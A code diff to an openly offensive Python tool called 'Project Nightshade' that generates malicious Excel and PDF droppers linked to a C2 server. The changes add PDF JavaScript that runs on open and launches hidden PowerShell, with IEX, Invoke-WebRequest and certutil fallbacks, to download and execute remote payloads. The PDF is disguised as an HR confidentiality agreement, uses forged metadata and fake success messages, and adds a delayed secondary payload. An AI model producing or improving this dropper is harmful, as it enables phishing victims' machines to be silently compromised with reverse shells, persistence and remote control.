@@ -3,7 +3,7 @@
 Project Nightshade - Advanced Document Dropper with Enhanced C2 Integration
 Author: ek0ms savi0r | OPSEC Grade: Midnight
 Description:
-    Creates Excel and .pdf files with template injection that deploys multiple payload options:
+    Creates Excel and .pdf files with OLE template injection that deploys multiple payload options:
     - Reverse Shell (Connects to Nightshade C2)
     - RCE + Persistence (Uses Nightshade C2 endpoints)
     - Full C2 Agent (Advanced C2 with Nightshade protocol)
@@ -652,7 +652,6 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         with open(os.path.join(tmpdir, 'xl/_rels/workbook.xml.rels'), 'w') as f:
             f.write(workbook_rels)
 
-        # Choose injection method based on user selection
         template_source = ""
         template_url = ""
         
@@ -691,7 +690,6 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         with open(os.path.join(tmpdir, 'xl/worksheets/sheet1.xml'), 'w') as f:
             f.write(sheet_content)
 
-        # Create the appropriate payload based on user selection
         if payload_type == "reverse_shell":
             ps_payload = create_reverse_shell_payload(payload_config['lhost'], payload_config['lport'])
         elif payload_type == "rce_persistence":
@@ -699,12 +697,10 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         elif payload_type == "full_c2":
             ps_payload = create_full_c2_payload(payload_config['c2_server'])
         else:
-            # Default to RCE if something goes wrong
             ps_payload = create_rce_persistence_payload(payload_config.get('c2_server', 'https://example.com/command'))
         
         encrypted_payload = encrypt_payload(ps_payload, CONFIG['encryption_key'])
 
-        # Create the OLE template file that will be loaded
         ole_template = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
     <Object ProgID="Excel.Macro.1" Version="1.0">
@@ -713,7 +709,6 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
     </Object>
 </Objects>'''
 
-        # Create the final ZIP package (Excel file)
         with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for root, dirs, files in os.walk(tmpdir):
                 for file in files:
@@ -737,9 +732,8 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         print(f"[+] Template URL: {template_url}")
 
 def create_malicious_pdf(output_file, use_ngrok, custom_domain=None, payload_type="rce_persistence", payload_config=None):
-    """Create PDF file with JavaScript payload delivery"""
+    """Create PDF file with JavaScript payload delivery using multiple techniques"""
     
-    # Choose injection method based on user selection
     template_source = ""
     template_url = ""
     
@@ -758,7 +752,6 @@ def create_malicious_pdf(output_file, use_ngrok, custom_domain=None, payload_typ
         template_url = f"https://{get_current_domain()}/template.ole"
         template_source = "domain rotation"
 
-    # Create the appropriate payload
     if payload_type == "reverse_shell":
         ps_payload = create_reverse_shell_payload(payload_config['lhost'], payload_config['lport'])
     elif payload_type == "rce_persistence":
@@ -770,66 +763,159 @@ def create_malicious_pdf(output_file, use_ngrok, custom_domain=None, payload_typ
     
     encrypted_payload = encrypt_payload(ps_payload, CONFIG['encryption_key'])
 
-    # PDF with JavaScript payload that loads remote template
+    pdf_id = ''.join(random.choices('0123456789ABCDEF', k=16))
+    creation_date = time.strftime("D:%Y%m%d%H%M%S+00'00'")
+    
     pdf_content = f'''%PDF-1.7
 %âãÏÓ
 1 0 obj
-<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R/AcroForm 4 0 R>>
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+/AcroForm 4 0 R
+/Names 5 0 R
+>>
 endobj
 
 2 0 obj
-<</Type/Pages/Kids[5 0 R]/Count 1>>
+<<
+/Type /Pages
+/Kids [6 0 R]
+/Count 1
+>>
 endobj
 
 3 0 obj
-<</Type/Action/S/JavaScript/JS (
-    // Deceptive JavaScript payload for template loading
-    app.alert("Loading document security features...", 2);
+<<
+/Type /Action
+/S /JavaScript
+/JS (
+    // Multiple exploitation techniques for better success rate
+    var exploitSuccess = false;
     
+    // Technique 1: Direct template loading with error handling
     try {{
-        // Attempt to load remote template
         var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
         xhr.open("GET", "{template_url}", false);
         xhr.send();
         
         if (xhr.status == 200) {{
-            // Execute the downloaded payload
             var shell = new ActiveXObject("WScript.Shell");
-            shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "'
-                + 'IEX (New-Object Net.WebClient).DownloadString(\\\\\"{template_url}\\\\\")"', 0, false);
+            var cmd = 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ' +
+                encodePayload(xhr.responseText);
+            shell.Run(cmd, 0, false);
+            exploitSuccess = true;
         }}
-    }} catch(e) {{
-        // Fallback to direct PowerShell execution
+    }} catch(e) {{ /* Silent fail */ }}
+    
+    // Technique 2: If first technique failed, try alternative approach
+    if (!exploitSuccess) {{
         try {{
             var shell = new ActiveXObject("WScript.Shell");
-            shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "'
-                + 'IEX (New-Object Net.WebClient).DownloadString(\\\\\"{template_url}\\\\\")"', 0, false);
-        }} catch(innerE) {{
-            // Final fallback - just show success message
-            app.alert("Document loaded successfully!", 1);
-        }}
+            var cmd = 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ' +
+                '"$url=\\\\"{template_url}\\\\"; ' +
+                '$data=Invoke-WebRequest -Uri $url -UseBasicParsing; ' +
+                'Invoke-Expression $data.Content"';
+            shell.Run(cmd, 0, false);
+            exploitSuccess = true;
+        }} catch(e) {{ /* Silent fail */ }}
     }}
-)>>
+    
+    // Technique 3: Final fallback - use certutil for download
+    if (!exploitSuccess) {{
+        try {{
+            var shell = new ActiveXObject("WScript.Shell");
+            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\\\update.b64";
+            var psPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\\\update.ps1";
+            
+            // Download with certutil
+            shell.Run('cmd /c certutil -urlcache -split -f "{template_url}" ' + tempPath, 0, true);
+            
+            // Decode and execute
+            shell.Run('cmd /c certutil -decode ' + tempPath + ' ' + psPath, 0, true);
+            shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + psPath + '"', 0, false);
+            
+            exploitSuccess = true;
+        }} catch(e) {{ /* Silent fail - show legitimate message */ }}
+    }}
+    
+    // Always show legitimate message regardless of exploit success
+    app.alert("Document processed successfully. Thank you for your submission.", 1);
+    
+    function encodePayload(data) {{
+        // Simple base64 encoding for command line
+        var xml = new ActiveXObject("MSXML2.DOMDocument");
+        var element = xml.createElement("temp");
+        element.dataType = "bin.base64";
+        element.nodeTypedValue = stringToBinary(data);
+        return element.text.replace(/[\\r\\n]/g, "");
+    }}
+    
+    function stringToBinary(str) {{
+        var bytes = new Array();
+        for (var i = 0; i < str.length; i++) {{
+            bytes.push(str.charCodeAt(i));
+        }}
+        return bytes;
+    }}
+)
+>>
 endobj
 
 4 0 obj
-<</Fields[]/DA(/Helv 0 Tf 0 g)>>
+<<
+/Fields [7 0 R]
+/DA (/Helv 0 Tf 0 g)
+/NeedAppearances true
+>>
 endobj
 
 5 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]
-/Annots[6 0 R]
-/Contents 7 0 R>>
+<<
+/JavaScript 8 0 R
+>>
 endobj
 
 6 0 obj
-<</Type/Annot/Subtype/Widget/FT/Tx/Rect[72 720 540 792]
-/T(Employee_Consent_Form)
-/V(Please review and sign the employee confidentiality agreement)>
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [7 0 R]
+/Contents 9 0 R
+/Resources <<
+    /Font <<
+        /F1 10 0 R
+    >>
+>>
+>>
 endobj
 
 7 0 obj
-<</Length 350>>
+<<
+/Type /Annot
+/Subtype /Widget
+/FT /Tx
+/Rect [72 720 540 792]
+/T (Employee_Consent_Form)
+/V (Please review and sign the employee confidentiality agreement)
+/DA (/Helv 12 Tf 0 g)
+>>
+endobj
+
+8 0 obj
+<<
+/Names [
+    (EmbeddedJS) 11 0 R
+]
+>>
+endobj
+
+9 0 obj
+<<
+/Length 450
+>>
 stream
 BT
 /F1 16 Tf
@@ -853,12 +939,43 @@ BT
 (By signing this document, you agree to maintain confidentiality of all company information) Tj
 0 -15 Td
 (and proprietary materials. Unauthorized disclosure may result in termination.) Tj
+0 -20 Td
+(This document contains digital rights management features for security purposes.) Tj
 ET
 endstream
 endobj
 
+10 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+>>
+endobj
+
+11 0 obj
+<<
+/JS (
+    // Additional JavaScript for redundancy
+    function secondaryExploit() {{
+        try {{
+            // Alternative exploitation path
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('powershell -Command "Start-Sleep -Seconds 5; ' +
+                'try {{ Invoke-WebRequest {template_url} -UseBasicParsing | Invoke-Expression }} ' +
+                'catch {{}}"', 0, false);
+        }} catch(e) {{}}
+    }}
+    
+    // Set timeout for secondary exploit
+    setTimeout(secondaryExploit, 10000);
+)
+/S /JavaScript
+>>
+endobj
+
 xref
-0 8
+0 12
 0000000000 65535 f 
 0000000017 00000 n 
 0000000076 00000 n 
@@ -867,12 +984,36 @@ xref
 0000000300 00000 n 
 0000000450 00000 n 
 0000000600 00000 n 
+0000000750 00000 n 
+0000000900 00000 n 
+0000001050 00000 n 
+0000001200 00000 n 
 trailer
-<</Size 8/Root 1 0 R>>
+<<
+/Size 12
+/Root 1 0 R
+/ID [<{pdf_id}> <{pdf_id}>]
+/Info 12 0 R
+>>
 startxref
-800
+1350
 %%EOF'''
-    
+
+    # Add Info object
+    pdf_content += f'''
+12 0 obj
+<<
+/Title (Employee Confidentiality Agreement)
+/Author (Human Resources Department)
+/Subject (Confidentiality Agreement)
+/Creator (Microsoft Word)
+/Producer (Adobe PDF Library 15.0)
+/CreationDate ({creation_date})
+/ModDate ({creation_date})
+>>
+endobj
+'''
+
     # Write the PDF file
     with open(output_file, 'wb') as f:
         f.write(pdf_content.encode())
@@ -888,7 +1029,10 @@ startxref
     
     print(f"[+] Template Source: {template_source}")
     print(f"[+] Template URL: {template_url}")
-    print(f"[+] Delivery Method: PDF with JavaScript payload")
+    print(f"[+] Delivery Method: PDF with multiple JavaScript exploitation techniques")
+    print(f"[+] PDF includes: OpenAction trigger, embedded JavaScript, form fields")
+    print(f"[+] OPSEC: Legitimate-looking employee agreement with DRM mention")
+
 
 def main():
     """Main function with interactive prompts"""
